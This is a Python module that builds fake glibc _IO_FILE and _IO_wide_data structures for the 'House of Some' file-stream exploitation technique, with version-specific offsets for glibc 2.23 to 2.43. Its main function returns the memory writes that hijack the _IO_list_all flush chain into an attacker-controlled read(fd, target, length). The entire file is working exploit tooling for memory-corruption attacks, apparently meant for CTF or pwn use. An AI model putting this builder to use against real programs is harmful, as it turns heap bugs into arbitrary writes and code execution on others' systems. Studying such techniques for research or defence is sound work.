"""House of Some first-hop FILE sink layout builder."""
from __future__ import annotations
from dataclasses import dataclass

WIDE_OFFSETS = {**{f"2.{i}": 0x130 for i in range(23, 30)}, "2.30": 0xF0}
WIDE_OFFSETS.update({f"2.{i}": 0xE0 for i in range(31, 44)})

@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str

def _p(v: int) -> bytes:
    if not isinstance(v, int) or isinstance(v, bool) or not 0 <= v < 1 << 64:
        raise ValueError("address must be an unsigned 64-bit integer")
    return v.to_bytes(8, "little")

def build_house_of_some(version: str, *, file_addr: int, wide_addr: int,
                        file_jumps_addr: int, wfile_jumps_addr: int,
                        target_addr: int, target_length: int, fd: int,
                        lock_addr: int, list_all_addr: int,
                        prevchain_addr: int | None = None) -> tuple[MemoryWrite, ...]:
    """生成 Some 第一跳：flush 链进入 read(fd, target, length)。

    version: 选择 wide_data ABI。
    file_addr/wide_addr: fake FILE 和 fake wide_data 地址。
    file_jumps_addr: `_IO_file_jumps`，用于 wide vtable -0x48。
    wfile_jumps_addr: 合法 primary `_IO_wfile_jumps`。
    target_addr/target_length/fd: 第一跳 read 的目标、长度和文件描述符。
    lock_addr: FILE `_lock` 地址；list_all_addr: `_IO_list_all` 槽地址。
    prevchain_addr: 2.40+ 的 `_prevchain`，通常为 list_all_addr。
    """
    if version not in WIDE_OFFSETS:
        raise ValueError("House of Some supports glibc 2.23 through 2.43")
    if target_length <= 0 or target_length >= 1 << 64 or fd < 0 or fd >= 1 << 32:
        raise ValueError("invalid target length or fd")
    end = target_addr + target_length
    if end >= 1 << 64:
        raise ValueError("target range overflows")
    file = bytearray(0xe0)
    file[0:8] = (0x80).to_bytes(8, "little")
    file[0x18:0x20] = _p(target_addr)
    file[0x20:0x28] = _p(target_addr)
    file[0x28:0x30] = _p(target_addr)
    file[0x30:0x38] = _p(end)
    file[0x38:0x40] = _p(target_addr)
    file[0x40:0x48] = _p(end)
    file[0x70:0x74] = fd.to_bytes(4, "little")
    file[0x98:0xa0] = _p(0)
    file[0xa0:0xa8] = _p(wide_addr)
    file[0xc0:0xc4] = (2).to_bytes(4, "little")
    file[0xd8:0xe0] = _p(wfile_jumps_addr)
    writes = [MemoryWrite(file_addr, bytes(file), f"FILE ({version})")]
    wide_size = WIDE_OFFSETS[version] + 8
    wide = bytearray(wide_size)
    wide[0x18:0x20] = _p(0)
    wide[0x20:0x28] = _p(1)
    wide[0x30:0x38] = _p(0)
    wide[WIDE_OFFSETS[version]:WIDE_OFFSETS[version] + 8] = _p(file_jumps_addr - 0x48)
    writes.append(MemoryWrite(wide_addr, bytes(wide), f"wide_data ({version})"))
    if version >= "2.40":
        if prevchain_addr is None:
            raise ValueError("2.40+ requires prevchain_addr")
        writes[0] = MemoryWrite(file_addr, bytes(file[:0xb8] + _p(prevchain_addr) + file[0xc0:]), f"FILE ({version})")
    return tuple(writes)
